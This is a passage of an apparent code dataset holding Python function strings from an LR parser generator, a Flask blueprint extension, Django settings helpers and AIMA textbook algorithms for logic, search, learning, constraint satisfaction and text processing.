            "def goto(self, rules, symbol):\n        \"\"\"Computes the next closure for rules based on the symbol we got.\n\n        Args:\n            rules - an iterable of DottedRules\n            symbol - a string denoting the symbol we've just seen\n\n        Returns: frozenset of DottedRules\n        \"\"\"\n        return self.closure(\n            {rule.move_dot() for rule in rules\n             if not rule.at_end and rule.rhs[rule.pos] == symbol},\n        )"
        ],
        [
            "def closure(self, rules):\n        \"\"\"Fills out the entire closure based on some initial dotted rules.\n\n        Args:\n            rules - an iterable of DottedRules\n\n        Returns: frozenset of DottedRules\n\n        \"\"\"\n        closure = set()\n\n        todo = set(rules)\n        while todo:\n            rule = todo.pop()\n            closure.add(rule)\n\n            # If the dot is at the end, there's no need to process it.\n            if rule.at_end:\n                continue\n\n            symbol = rule.rhs[rule.pos]\n            for production in self.nonterminals[symbol]:\n                for first in self.first(rule.rest):\n                    if EPSILON in production.rhs:\n                        # Move immediately to the end if the production\n                        # goes to epsilon\n                        new_rule = DottedRule(production, 1, first)\n                    else:\n                        new_rule = DottedRule(production, 0, first)\n\n                    if new_rule not in closure:\n                        todo.add(new_rule)\n\n        return frozenset(closure)"
        ],
        [
            "def init_app(self, app):\n        \"\"\"Initializes Journey extension\n\n        :param app: App passed from constructor or directly to init_app\n        :raises:\n            - NoBundlesAttached if no bundles has been attached attached\n\n        \"\"\"\n\n        if len(self._attached_bundles) == 0:\n            raise NoBundlesAttached(\"At least one bundle must be attached before initializing Journey\")\n\n        for bundle in self._attached_bundles:\n            processed_bundle = {\n                'path': bundle.path,\n                'description': bundle.description,\n                'blueprints': []\n            }\n\n            for (bp, description) in bundle.blueprints:\n                # Register the BP\n                blueprint = self._register_blueprint(app, bp, bundle.path,\n                                                     self.get_bp_path(bp), description)\n\n                # Finally, attach the blueprints to its parent\n                processed_bundle['blueprints'].append(blueprint)\n\n            self._registered_bundles.append(processed_bundle)"
        ],
        [
            "def routes_simple(self):\n        \"\"\"Returns simple info about registered blueprints\n\n        :return: Tuple containing endpoint, path and allowed methods for each route\n        \"\"\"\n\n        routes = []\n\n        for bundle in self._registered_bundles:\n            bundle_path = bundle['path']\n            for blueprint in bundle['blueprints']:\n                bp_path = blueprint['path']\n                for child in blueprint['routes']:\n                    routes.append(\n                        (\n                            child['endpoint'],\n                            bundle_path + bp_path + child['path'],\n                            child['methods']\n                        )\n                    )\n\n        return routes"
        ],
        [
            "def _bundle_exists(self, path):\n        \"\"\"Checks if a bundle exists at the provided path\n\n        :param path: Bundle path\n        :return: bool\n        \"\"\"\n\n        for attached_bundle in self._attached_bundles:\n            if path == attached_bundle.path:\n                return True\n\n        return False"
        ],
        [
            "def attach_bundle(self, bundle):\n        \"\"\"Attaches a bundle object\n\n        :param bundle: :class:`flask_journey.BlueprintBundle` object\n        :raises:\n            - IncompatibleBundle if the bundle is not of type `BlueprintBundle`\n            - ConflictingPath if a bundle already exists at bundle.path\n            - MissingBlueprints if the bundle doesn't contain any blueprints\n        \"\"\"\n\n        if not isinstance(bundle, BlueprintBundle):\n            raise IncompatibleBundle('BlueprintBundle object passed to attach_bundle must be of type {0}'\n                                     .format(BlueprintBundle))\n        elif len(bundle.blueprints) == 0:\n            raise MissingBlueprints(\"Bundles must contain at least one flask.Blueprint\")\n        elif self._bundle_exists(bundle.path):\n            raise ConflictingPath(\"Duplicate bundle path {0}\".format(bundle.path))\n        elif self._journey_path == bundle.path == '/':\n            raise ConflictingPath(\"Bundle path and Journey path cannot both be {0}\".format(bundle.path))\n\n        self._attached_bundles.append(bundle)"
        ],
        [
            "def _register_blueprint(self, app, bp, bundle_path, child_path, description):\n        \"\"\"Register and return info about the registered blueprint\n\n        :param bp: :class:`flask.Blueprint` object\n        :param bundle_path: the URL prefix of the bundle\n        :param child_path: blueprint relative to the bundle path\n        :return: Dict with info about the blueprint\n        \"\"\"\n\n        base_path = sanitize_path(self._journey_path + bundle_path + child_path)\n\n        app.register_blueprint(bp, url_prefix=base_path)\n\n        return {\n            'name': bp.name,\n            'path': child_path,\n            'import_name': bp.import_name,\n            'description': description,\n            'routes': self.get_blueprint_routes(app, base_path)\n        }"
        ],
        [
            "def get_blueprint_routes(app, base_path):\n        \"\"\"Returns detailed information about registered blueprint routes matching the `BlueprintBundle` path\n\n        :param app: App instance to obtain rules from\n        :param base_path: Base path to return detailed route info for\n        :return: List of route detail dicts\n        \"\"\"\n\n        routes = []\n\n        for child in app.url_map.iter_rules():\n            if child.rule.startswith(base_path):\n                relative_path = child.rule[len(base_path):]\n                routes.append({\n                    'path': relative_path,\n                    'endpoint': child.endpoint,\n                    'methods': list(child.methods)\n                })\n\n        return routes"
        ],
        [
            "def compute_precedence(terminals, productions, precedence_levels):\n        \"\"\"Computes the precedence of terminal and production.\n\n        The precedence of a terminal is it's level in the PRECEDENCE tuple. For\n        a production, the precedence is the right-most terminal (if it exists).\n        The default precedence is DEFAULT_PREC - (LEFT, 0).\n\n        Returns:\n            precedence - dict[terminal | production] = (assoc, level)\n\n        \"\"\"\n        precedence = collections.OrderedDict()\n\n        for terminal in terminals:\n            precedence[terminal] = DEFAULT_PREC\n\n        level_precs = range(len(precedence_levels), 0, -1)\n        for i, level in zip(level_precs, precedence_levels):\n            assoc = level[0]\n            for symbol in level[1:]:\n                precedence[symbol] = (assoc, i)\n\n        for production, prec_symbol in productions:\n            if prec_symbol is None:\n                prod_terminals = [symbol for symbol in production.rhs\n                                  if symbol in terminals] or [None]\n                precedence[production] = precedence.get(prod_terminals[-1],\n                                                        DEFAULT_PREC)\n            else:\n                precedence[production] = precedence.get(prec_symbol,\n                                                        DEFAULT_PREC)\n\n        return precedence"
        ],
        [
            "def make_tables(grammar, precedence):\n        \"\"\"Generates the ACTION and GOTO tables for the grammar.\n\n        Returns:\n            action - dict[state][lookahead] = (action, ...)\n            goto - dict[state][just_reduced] = new_state\n\n        \"\"\"\n        ACTION = {}\n        GOTO = {}\n\n        labels = {}\n\n        def get_label(closure):\n            if closure not in labels:\n                labels[closure] = len(labels)\n            return labels[closure]\n\n        def resolve_shift_reduce(lookahead, s_action, r_action):\n            s_assoc, s_level = precedence[lookahead]\n            r_assoc, r_level = precedence[r_action[1]]\n\n            if s_level < r_level:\n                return r_action\n            elif s_level == r_level and r_assoc == LEFT:\n                return r_action\n            else:\n                return s_action\n\n        initial, closures, goto = grammar.closures()\n        for closure in closures:\n            label = get_label(closure)\n\n            for rule in closure:\n                new_action, lookahead = None, rule.lookahead\n\n                if not rule.at_end:\n                    symbol = rule.rhs[rule.pos]\n                    is_terminal = symbol in grammar.terminals\n                    has_goto = symbol in goto[closure]\n                    if is_terminal and has_goto:\n                        next_state = get_label(goto[closure][symbol])\n                        new_action, lookahead = ('shift', next_state), symbol\n                elif rule.production == grammar.start and rule.at_end:\n                    new_action = ('accept',)\n                elif rule.at_end:\n                    new_action = ('reduce', rule.production)\n\n                if new_action is None:\n                    continue\n\n                prev_action = ACTION.get((label, lookahead))\n                if prev_action is None or prev_action == new_action:\n                    ACTION[label, lookahead] = new_action\n                else:\n                    types = (prev_action[0], new_action[0])\n                    if types == ('shift', 'reduce'):\n                        chosen = resolve_shift_reduce(lookahead,\n                                                      prev_action,\n                                                      new_action)\n                    elif types == ('reduce', 'shift'):\n                        chosen = resolve_shift_reduce(lookahead,\n                                                      new_action,\n                                                      prev_action)\n                    else:\n                        raise TableConflictError(prev_action, new_action)\n\n                    ACTION[label, lookahead] = chosen\n\n            for symbol in grammar.nonterminals:\n                if symbol in goto[closure]:\n                    GOTO[label, symbol] = get_label(goto[closure][symbol])\n\n        return get_label(initial), ACTION, GOTO"
        ],
        [
            "def parse_definite_clause(s):\n    \"Return the antecedents and the consequent of a definite clause.\"\n    assert is_definite_clause(s)\n    if is_symbol(s.op):\n        return [], s\n    else:\n        antecedent, consequent = s.args\n        return conjuncts(antecedent), consequent"
        ],
        [
            "def tt_check_all(kb, alpha, symbols, model):\n    \"Auxiliary routine to implement tt_entails.\"\n    if not symbols:\n        if pl_true(kb, model):\n            result = pl_true(alpha, model)\n            assert result in (True, False)\n            return result\n        else:\n            return True\n    else:\n        P, rest = symbols[0], symbols[1:]\n        return (tt_check_all(kb, alpha, rest, extend(model, P, True)) and\n                tt_check_all(kb, alpha, rest, extend(model, P, False)))"
        ],
        [
            "def prop_symbols(x):\n    \"Return a list of all propositional symbols in x.\"\n    if not isinstance(x, Expr):\n        return []\n    elif is_prop_symbol(x.op):\n        return [x]\n    else:\n        return list(set(symbol for arg in x.args\n                        for symbol in prop_symbols(arg)))"
        ],
        [
            "def pl_true(exp, model={}):\n    \"\"\"Return True if the propositional logic expression is true in the model,\n    and False if it is false. If the model does not specify the value for\n    every proposition, this may return None to indicate 'not obvious';\n    this may happen even when the expression is tautological.\"\"\"\n    op, args = exp.op, exp.args\n    if exp == TRUE:\n        return True\n    elif exp == FALSE:\n        return False\n    elif is_prop_symbol(op):\n        return model.get(exp)\n    elif op == '~':\n        p = pl_true(args[0], model)\n        if p is None: return None\n        else: return not p\n    elif op == '|':\n        result = False\n        for arg in args:\n            p = pl_true(arg, model)\n            if p is True: return True\n            if p is None: result = None\n        return result\n    elif op == '&':\n        result = True\n        for arg in args:\n            p = pl_true(arg, model)\n            if p is False: return False\n            if p is None: result = None\n        return result\n    p, q = args\n    if op == '>>':\n        return pl_true(~p | q, model)\n    elif op == '<<':\n        return pl_true(p | ~q, model)\n    pt = pl_true(p, model)\n    if pt is None: return None\n    qt = pl_true(q, model)\n    if qt is None: return None\n    if op == '<=>':\n        return pt == qt\n    elif op == '^':\n        return pt != qt\n    else:\n        raise ValueError, \"illegal operator in logic expression\" + str(exp)"
        ],
        [
            "def dpll(clauses, symbols, model):\n    \"See if the clauses are true in a partial model.\"\n    unknown_clauses = [] ## clauses with an unknown truth value\n    for c in clauses:\n        val =  pl_true(c, model)\n        if val == False:\n            return False\n        if val != True:\n            unknown_clauses.append(c)\n    if not unknown_clauses:\n        return model\n    P, value = find_pure_symbol(symbols, unknown_clauses)\n    if P:\n        return dpll(clauses, removeall(P, symbols), extend(model, P, value))\n    P, value = find_unit_clause(clauses, model)\n    if P:\n        return dpll(clauses, removeall(P, symbols), extend(model, P, value))\n    P, symbols = symbols[0], symbols[1:]\n    return (dpll(clauses, symbols, extend(model, P, True)) or\n            dpll(clauses, symbols, extend(model, P, False)))"
        ],
        [
            "def is_variable(x):\n    \"A variable is an Expr with no args and a lowercase symbol as the op.\"\n    return isinstance(x, Expr) and not x.args and is_var_symbol(x.op)"
        ],
        [
            "def retract(self, sentence):\n        \"Remove the sentence's clauses from the KB.\"\n        for c in conjuncts(to_cnf(sentence)):\n            if c in self.clauses:\n                self.clauses.remove(c)"
        ],
        [
            "def refresh(self):\n        \"\"\"\n        Updates the cache with setting values from the database.\n        \"\"\"\n        # `values_list('name', 'value')` doesn't work because `value` is not a\n        # setting (base class) field, it's a setting value (subclass) field. So\n        # we have to get real instances.\n        args = [(obj.name, obj.value) for obj in self.queryset.all()]\n        super(SettingDict, self).update(args)\n        self.empty_cache = False"
        ],
        [
            "def alphabeta_search(state, game, d=4, cutoff_test=None, eval_fn=None):\n    \"\"\"Search game to determine best action; use alpha-beta pruning.\n    This version cuts off search and uses an evaluation function.\"\"\"\n\n    player = game.to_move(state)\n\n    def max_value(state, alpha, beta, depth):\n        if cutoff_test(state, depth):\n            return eval_fn(state)\n        v = -infinity\n        for a in game.actions(state):\n            v = max(v, min_value(game.result(state, a),\n                                 alpha, beta, depth+1))\n            if v >= beta:\n                return v\n            alpha = max(alpha, v)\n        return v\n\n    def min_value(state, alpha, beta, depth):\n        if cutoff_test(state, depth):\n            return eval_fn(state)\n        v = infinity\n        for a in game.actions(state):\n            v = min(v, max_value(game.result(state, a),\n                                 alpha, beta, depth+1))\n            if v <= alpha:\n                return v\n            beta = min(beta, v)\n        return v\n\n    # Body of alphabeta_search starts here:\n    # The default test cuts off at depth d or at a terminal state\n    cutoff_test = (cutoff_test or\n                   (lambda state,depth: depth>d or game.terminal_test(state)))\n    eval_fn = eval_fn or (lambda state: game.utility(state, player))\n    return argmax(game.actions(state),\n                  lambda a: min_value(game.result(state, a),\n                                      -infinity, infinity, 0))"
        ],
        [
            "def utility(self, state, player):\n        \"Return the value to player; 1 for win, -1 for loss, 0 otherwise.\"\n        return if_(player == 'X', state.utility, -state.utility)"
        ],
        [
            "def compute_utility(self, board, move, player):\n        \"If X wins with this move, return 1; if O return -1; else return 0.\"\n        if (self.k_in_row(board, move, player, (0, 1)) or\n            self.k_in_row(board, move, player, (1, 0)) or\n            self.k_in_row(board, move, player, (1, -1)) or\n            self.k_in_row(board, move, player, (1, 1))):\n            return if_(player == 'X', +1, -1)\n        else:\n            return 0"
        ],
        [
            "def k_in_row(self, board, move, player, (delta_x, delta_y)):\n        \"Return true if there is a line through move on board for player.\"\n        x, y = move\n        n = 0 # n is number of moves in row\n        while board.get((x, y)) == player:\n            n += 1\n            x, y = x + delta_x, y + delta_y\n        x, y = move\n        while board.get((x, y)) == player:\n            n += 1\n            x, y = x - delta_x, y - delta_y\n        n -= 1 # Because we counted move itself twice\n        return n >= self.k"
        ],
        [
            "def update(x, **entries):\n    \"\"\"Update a dict, or an object with slots, according to `entries` dict.\n\n    >>> update({'a': 1}, a=10, b=20)\n    {'a': 10, 'b': 20}\n    >>> update(Struct(a=1), a=10, b=20)\n    Struct(a=10, b=20)\n    \"\"\"\n    if isinstance(x, dict):\n        x.update(entries)\n    else:\n        x.__dict__.update(entries)\n    return x"
        ],
        [
            "def weighted_sample_with_replacement(seq, weights, n):\n    \"\"\"Pick n samples from seq at random, with replacement, with the\n    probability of each element in proportion to its corresponding\n    weight.\"\"\"\n    sample = weighted_sampler(seq, weights)\n    return [sample() for s in range(n)]"
        ],
        [
            "def weighted_sampler(seq, weights):\n    \"Return a random-sample function that picks from seq weighted by weights.\"\n    totals = []\n    for w in weights:\n        totals.append(w + totals[-1] if totals else w)\n    return lambda: seq[bisect.bisect(totals, random.uniform(0, totals[-1]))]"
        ],
        [
            "def printf(format, *args):\n    \"\"\"Format args with the first argument as format string, and write.\n    Return the last arg, or format itself if there are no args.\"\"\"\n    sys.stdout.write(str(format) % args)\n    return if_(args, lambda: args[-1], lambda: format)"
        ],
        [
            "def name(object):\n    \"Try to find some reasonable name for the object.\"\n    return (getattr(object, 'name', 0) or getattr(object, '__name__', 0)\n            or getattr(getattr(object, '__class__', 0), '__name__', 0)\n            or str(object))"
        ],
        [
            "def AIMAFile(components, mode='r'):\n    \"Open a file based at the AIMA root directory.\"\n    import utils\n    dir = os.path.dirname(utils.__file__)\n    return open(apply(os.path.join, [dir] + components), mode)"
        ],
        [
            "def NaiveBayesLearner(dataset):\n    \"\"\"Just count how many times each value of each input attribute\n    occurs, conditional on the target value. Count the different\n    target values too.\"\"\"\n\n    targetvals = dataset.values[dataset.target]\n    target_dist = CountingProbDist(targetvals)\n    attr_dists = dict(((gv, attr), CountingProbDist(dataset.values[attr]))\n                      for gv in targetvals\n                      for attr in dataset.inputs)\n    for example in dataset.examples:\n        targetval = example[dataset.target]\n        target_dist.add(targetval)\n        for attr in dataset.inputs:\n            attr_dists[targetval, attr].add(example[attr])\n\n    def predict(example):\n        \"\"\"Predict the target value for example. Consider each possible value,\n        and pick the most likely by looking at each attribute independently.\"\"\"\n        def class_probability(targetval):\n            return (target_dist[targetval]\n                    * product(attr_dists[targetval, attr][example[attr]]\n                              for attr in dataset.inputs))\n        return argmax(targetvals, class_probability)\n\n    return predict"
        ],
        [
            "def information_content(values):\n    \"Number of bits to represent the probability distribution in values.\"\n    probabilities = normalize(removeall(0, values))\n    return sum(-p * log2(p) for p in probabilities)"
        ],
        [
            "def NeuralNetLearner(dataset, sizes):\n   \"\"\"Layered feed-forward network.\"\"\"\n\n   activations = map(lambda n: [0.0 for i in range(n)], sizes)\n   weights = []\n\n   def predict(example):\n      unimplemented()\n\n   return predict"
        ],
        [
            "def EnsembleLearner(learners):\n    \"\"\"Given a list of learning algorithms, have them vote.\"\"\"\n    def train(dataset):\n        predictors = [learner(dataset) for learner in learners]\n        def predict(example):\n            return mode(predictor(example) for predictor in predictors)\n        return predict\n    return train"
        ],
        [
            "def WeightedMajority(predictors, weights):\n    \"Return a predictor that takes a weighted vote.\"\n    def predict(example):\n        return weighted_mode((predictor(example) for predictor in predictors),\n                             weights)\n    return predict"
        ],
        [
            "def replicated_dataset(dataset, weights, n=None):\n    \"Copy dataset, replicating each example in proportion to its weight.\"\n    n = n or len(dataset.examples)\n    result = copy.copy(dataset)\n    result.examples = weighted_replicate(dataset.examples, weights, n)\n    return result"
        ],
        [
            "def leave1out(learner, dataset):\n    \"Leave one out cross-validation over the dataset.\"\n    return cross_validation(learner, dataset, k=len(dataset.examples))"
        ],
        [
            "def SyntheticRestaurant(n=20):\n    \"Generate a DataSet with n examples.\"\n    def gen():\n        example = map(random.choice, restaurant.values)\n        example[restaurant.target] = Fig[18,2](example)\n        return example\n    return RestaurantDataSet([gen() for i in range(n)])"
        ],
        [
            "def ContinuousXor(n):\n    \"2 inputs are chosen uniformly from (0.0 .. 2.0]; output is xor of ints.\"\n    examples = []\n    for i in range(n):\n        x, y = [random.uniform(0.0, 2.0) for i in '12']\n        examples.append([x, y, int(x) != int(y)])\n    return DataSet(name=\"continuous xor\", examples=examples)"
        ],
        [
            "def compare(algorithms=[PluralityLearner, NaiveBayesLearner,\n                        NearestNeighborLearner, DecisionTreeLearner],\n            datasets=[iris, orings, zoo, restaurant, SyntheticRestaurant(20),\n                      Majority(7, 100), Parity(7, 100), Xor(100)],\n            k=10, trials=1):\n    \"\"\"Compare various learners on various datasets using cross-validation.\n    Print results as a table.\"\"\"\n    print_table([[a.__name__.replace('Learner','')] +\n                 [cross_validation(a, d, k, trials) for d in datasets]\n                 for a in algorithms],\n                header=[''] + [d.name[0:7] for d in datasets], numfmt='%.2f')"
        ],
        [
            "def check_me(self):\n        \"Check that my fields make sense.\"\n        assert len(self.attrnames) == len(self.attrs)\n        assert self.target in self.attrs\n        assert self.target not in self.inputs\n        assert set(self.inputs).issubset(set(self.attrs))\n        map(self.check_example, self.examples)"
        ],
        [
            "def add_example(self, example):\n        \"Add an example to the list of examples, checking it first.\"\n        self.check_example(example)\n        self.examples.append(example)"
        ],
        [
            "def check_example(self, example):\n        \"Raise ValueError if example has any invalid values.\"\n        if self.values:\n            for a in self.attrs:\n                if example[a] not in self.values[a]:\n                    raise ValueError('Bad value %s for attribute %s in %s' %\n                                     (example[a], self.attrnames[a], example))"
        ],
        [
            "def attrnum(self, attr):\n        \"Returns the number used for attr, which can be a name, or -n .. n-1.\"\n        if attr < 0:\n            return len(self.attrs) + attr\n        elif isinstance(attr, str):\n            return self.attrnames.index(attr)\n        else:\n            return attr"
        ],
        [
            "def sanitize(self, example):\n       \"Return a copy of example, with non-input attributes replaced by None.\"\n       return [attr_i if i in self.inputs else None\n               for i, attr_i in enumerate(example)]"
        ],
        [
            "def add(self, o):\n        \"Add an observation o to the distribution.\"\n        self.smooth_for(o)\n        self.dictionary[o] += 1\n        self.n_obs += 1\n        self.sampler = None"
        ],
        [
            "def smooth_for(self, o):\n        \"\"\"Include o among the possible observations, whether or not\n        it's been observed yet.\"\"\"\n        if o not in self.dictionary:\n            self.dictionary[o] = self.default\n            self.n_obs += self.default\n            self.sampler = None"
        ],
        [
            "def sample(self):\n        \"Return a random sample from the distribution.\"\n        if self.sampler is None:\n            self.sampler = weighted_sampler(self.dictionary.keys(),\n                                            self.dictionary.values())\n        return self.sampler()"
        ],
        [
            "def revise(csp, Xi, Xj, removals):\n    \"Return true if we remove a value.\"\n    revised = False\n    for x in csp.curr_domains[Xi][:]:\n        # If Xi=x conflicts with Xj=y for every possible y, eliminate Xi=x\n        if every(lambda y: not csp.constraints(Xi, x, Xj, y),\n                 csp.curr_domains[Xj]):\n            csp.prune(Xi, x, removals)\n            revised = True\n    return revised"
        ],
        [
            "def mrv(assignment, csp):\n    \"Minimum-remaining-values heuristic.\"\n    return argmin_random_tie(\n        [v for v in csp.vars if v not in assignment],\n        lambda var: num_legal_values(csp, var, assignment))"
        ],
        [
            "def lcv(var, assignment, csp):\n    \"Least-constraining-values heuristic.\"\n    return sorted(csp.choices(var),\n                  key=lambda val: csp.nconflicts(var, val, assignment))"
        ],
        [
            "def forward_checking(csp, var, value, assignment, removals):\n    \"Prune neighbor values inconsistent with var=value.\"\n    for B in csp.neighbors[var]:\n        if B not in assignment:\n            for b in csp.curr_domains[B][:]:\n                if not csp.constraints(var, value, B, b):\n                    csp.prune(B, b, removals)\n            if not csp.curr_domains[B]:\n                return False\n    return True"
        ],
        [
            "def mac(csp, var, value, assignment, removals):\n    \"Maintain arc consistency.\"\n    return AC3(csp, [(X, var) for X in csp.neighbors[var]], removals)"
        ],
        [
            "def min_conflicts(csp, max_steps=100000):\n    \"\"\"Solve a CSP by stochastic hillclimbing on the number of conflicts.\"\"\"\n    # Generate a complete assignment for all vars (probably with conflicts)\n    csp.current = current = {}\n    for var in csp.vars:\n        val = min_conflicts_value(csp, var, current)\n        csp.assign(var, val, current)\n    # Now repeatedly choose a random conflicted variable and change it\n    for i in range(max_steps):\n        conflicted = csp.conflicted_vars(current)\n        if not conflicted:\n            return current\n        var = random.choice(conflicted)\n        val = min_conflicts_value(csp, var, current)\n        csp.assign(var, val, current)\n    return None"
        ],
        [
            "def min_conflicts_value(csp, var, current):\n    \"\"\"Return the value that will give var the least number of conflicts.\n    If there is a tie, choose at random.\"\"\"\n    return argmin_random_tie(csp.domains[var],\n                             lambda val: csp.nconflicts(var, val, current))"
        ],
        [
            "def nconflicts(self, var, val, assignment):\n        \"Return the number of conflicts var=val has with other variables.\"\n        # Subclasses may implement this more efficiently\n        def conflict(var2):\n            return (var2 in assignment\n                    and not self.constraints(var, val, var2, assignment[var2]))\n        return count_if(conflict, self.neighbors[var])"
        ],
        [
            "def suppose(self, var, value):\n        \"Start accumulating inferences from assuming var=value.\"\n        self.support_pruning()\n        removals = [(var, a) for a in self.curr_domains[var] if a != value]\n        self.curr_domains[var] = [value]\n        return removals"
        ],
        [
            "def prune(self, var, value, removals):\n        \"Rule out var=value.\"\n        self.curr_domains[var].remove(value)\n        if removals is not None: removals.append((var, value))"
        ],
        [
            "def infer_assignment(self):\n        \"Return the partial assignment implied by the current inferences.\"\n        self.support_pruning()\n        return dict((v, self.curr_domains[v][0])\n                    for v in self.vars if 1 == len(self.curr_domains[v]))"
        ],
        [
            "def restore(self, removals):\n        \"Undo a supposition and all inferences from it.\"\n        for B, b in removals:\n            self.curr_domains[B].append(b)"
        ],
        [
            "def conflicted_vars(self, current):\n        \"Return a list of variables in current assignment that are in conflict\"\n        return [var for var in self.vars\n                if self.nconflicts(var, current[var], current) > 0]"
        ],
        [
            "def nconflicts(self, var, val, assignment):\n        \"\"\"The number of conflicts, as recorded with each assignment.\n        Count conflicts in row and in up, down diagonals. If there\n        is a queen there, it can't conflict with itself, so subtract 3.\"\"\"\n        n = len(self.vars)\n        c = self.rows[val] + self.downs[var+val] + self.ups[var-val+n-1]\n        if assignment.get(var, None) == val:\n            c -= 3\n        return c"
        ],
        [
            "def assign(self, var, val, assignment):\n        \"Assign var, and keep track of conflicts.\"\n        oldval = assignment.get(var, None)\n        if val != oldval:\n            if oldval is not None: # Remove old val if there was one\n                self.record_conflict(assignment, var, oldval, -1)\n            self.record_conflict(assignment, var, val, +1)\n            CSP.assign(self, var, val, assignment)"
        ],
        [
            "def record_conflict(self, assignment, var, val, delta):\n        \"Record conflicts caused by addition or deletion of a Queen.\"\n        n = len(self.vars)\n        self.rows[val] += delta\n        self.downs[var + val] += delta\n        self.ups[var - val + n - 1] += delta"
        ],
        [
            "def viterbi_segment(text, P):\n    \"\"\"Find the best segmentation of the string of characters, given the\n    UnigramTextModel P.\"\"\"\n    # best[i] = best probability for text[0:i]\n    # words[i] = best word ending at position i\n    n = len(text)\n    words = [''] + list(text)\n    best = [1.0] + [0.0] * n\n    ## Fill in the vectors best, words via dynamic programming\n    for i in range(n+1):\n        for j in range(0, i):\n            w = text[j:i]\n            if P[w] * best[i - len(w)] >= best[i]:\n                best[i] = P[w] * best[i - len(w)]\n                words[i] = w\n    ## Now recover the sequence of best words\n    sequence = []; i = len(words)-1\n    while i > 0:\n        sequence[0:0] = [words[i]]\n        i = i - len(words[i])\n    ## Return sequence of best words and overall probability\n    return sequence, best[-1]"
        ],
        [
            "def encode(plaintext, code):\n    \"Encodes text, using a code which is a permutation of the alphabet.\"\n    from string import maketrans\n    trans = maketrans(alphabet + alphabet.upper(), code + code.upper())\n    return plaintext.translate(trans)"
        ],
        [
            "def samples(self, nwords):\n        \"\"\"Build up a random sample of text nwords words long, using\n        the conditional probability given the n-1 preceding words.\"\"\"\n        n = self.n\n        nminus1gram = ('',) * (n-1)\n        output = []\n        for i in range(nwords):\n            if nminus1gram not in self.cond_prob:\n                nminus1gram = ('',) * (n-1) # Cannot continue, so restart.\n            wn = self.cond_prob[nminus1gram].sample()\n            output.append(wn)\n            nminus1gram = nminus1gram[1:] + (wn,)\n        return ' '.join(output)"
        ],
        [
            "def index_collection(self, filenames):\n        \"Index a whole collection of files.\"\n        for filename in filenames:\n            self.index_document(open(filename).read(), filename)"
        ],
        [
            "def index_document(self, text, url):\n        \"Index the text of a document.\"\n        ## For now, use first line for title\n        title = text[:text.index('\\n')].strip()\n        docwords = words(text)\n        docid = len(self.documents)\n        self.documents.append(Document(title, url, len(docwords)))\n        for word in docwords:\n            if word not in self.stopwords:\n                self.index[word][docid] += 1"
        ],
        [
            "def score(self, word, docid):\n        \"Compute a score for this word on this docid.\"\n        ## There are many options; here we take a very simple approach\n        return (math.log(1 + self.index[word][docid])\n                / math.log(1 + self.documents[docid].nwords))"
        ],
        [
            "def present(self, results):\n        \"Present the results as a list.\"\n        for (score, d) in results:\n            doc = self.documents[d]\n            print (\"%5.2f|%25s | %s\"\n                   % (100 * score, doc.url, doc.title[:45].expandtabs()))"
        ],
        [
            "def present_results(self, query_text, n=10):\n        \"Get results for the query and present them.\"\n        self.present(self.query(query_text, n))"
        ],
        [
            "def score(self, plaintext):\n        \"Return a score for text based on how common letters pairs are.\"\n        s = 1.0\n        for bi in bigrams(plaintext):\n            s = s * self.P2[bi]\n        return s"
        ],
        [
            "def decode(self, ciphertext):\n        \"Search for a decoding of the ciphertext.\"\n        self.ciphertext = ciphertext\n        problem = PermutationDecoderProblem(decoder=self)\n        return search.best_first_tree_search(\n            problem, lambda node: self.score(node.state))"
        ],
        [
            "def score(self, code):\n        \"\"\"Score is product of word scores, unigram scores, and bigram scores.\n        This can get very small, so we use logs and exp.\"\"\"\n        text = permutation_decode(self.ciphertext, code)\n        logP = (sum([log(self.Pwords[word]) for word in words(text)]) +\n                sum([log(self.P1[c]) for c in text]) +\n                sum([log(self.P2[b]) for b in bigrams(text)]))\n        return exp(logP)"
        ],
        [
            "def get_value(self, context, default):\n        \"\"\"\n        Returns a ``SettingDict`` object.\n        \"\"\"\n        if default is None:\n            settings = self.setting_model.objects.as_dict()\n        else:\n            settings = self.setting_model.objects.as_dict(default=default)\n        return settings"
        ],
        [
            "def expected_utility(a, s, U, mdp):\n    \"The expected utility of doing a in state s, according to the MDP and U.\"\n    return sum([p * U[s1] for (p, s1) in mdp.T(s, a)])"
        ],
        [
            "def go(self, state, direction):\n        \"Return the state that results from going in this direction.\"\n        state1 = vector_add(state, direction)\n        return if_(state1 in self.states, state1, state)"
        ],
        [
            "def as_dict(self, default=None):\n        \"\"\"\n        Returns a ``SettingDict`` object for this queryset.\n        \"\"\"\n        settings = SettingDict(queryset=self, default=default)\n        return settings"
        ],
        [
            "def create(self, name, value):\n        \"\"\"\n        Creates and returns an object of the appropriate type for ``value``.\n        \"\"\"\n        if value is None:\n            raise ValueError('Setting value cannot be `None`.')\n        model = Setting.get_model_for_value(value)\n        # Call `create()` method on the super class to avoid recursion.\n        obj = super(SettingQuerySet, model.objects.all()) \\\n            .create(name=name, value=value)\n        return obj"
        ],
        [
            "def is_compatible(cls, value):\n        \"\"\"\n        Returns ``True`` if this model should be used to store ``value``.\n\n        Checks if ``value`` is an instance of ``value_type``. Override this\n        method if you need more advanced behaviour. For example, to distinguish\n        between single and multi-line text.\n        \"\"\"\n        if not hasattr(cls, 'value_type'):\n            raise NotImplementedError(\n                'You must define a `value_type` attribute or override the '\n                '`is_compatible()` method on `SettingValueModel` subclasses.')\n        return isinstance(value, cls.value_type)"
        ],
        [
            "def exp_schedule(k=20, lam=0.005, limit=100):\n    \"One possible schedule function for simulated annealing\"\n    return lambda t: if_(t < limit, k * math.exp(-lam * t), 0)"
        ],
        [
            "def genetic_search(problem, fitness_fn, ngen=1000, pmut=0.1, n=20):\n    \"\"\"Call genetic_algorithm on the appropriate parts of a problem.\n    This requires the problem to have states that can mate and mutate,\n    plus a value method that scores states.\"\"\"\n    s = problem.initial_state\n    states = [problem.result(s, a) for a in problem.actions(s)]\n    random.shuffle(states)\n    return genetic_algorithm(states[:n], problem.value, ngen, pmut)"
        ],
        [
            "def random_boggle(n=4):\n    \"\"\"Return a random Boggle board of size n x n.\n    We represent a board as a linear list of letters.\"\"\"\n    cubes = [cubes16[i % 16] for i in range(n*n)]\n    random.shuffle(cubes)\n    return map(random.choice, cubes)"
        ],
        [
            "def print_boggle(board):\n    \"Print the board in a 2-d array.\"\n    n2 = len(board); n = exact_sqrt(n2)\n    for i in range(n2):\n        if i % n == 0 and i > 0: print\n        if board[i] == 'Q': print 'Qu',\n        else: print str(board[i]) + ' ',\n    print"
        ],
        [
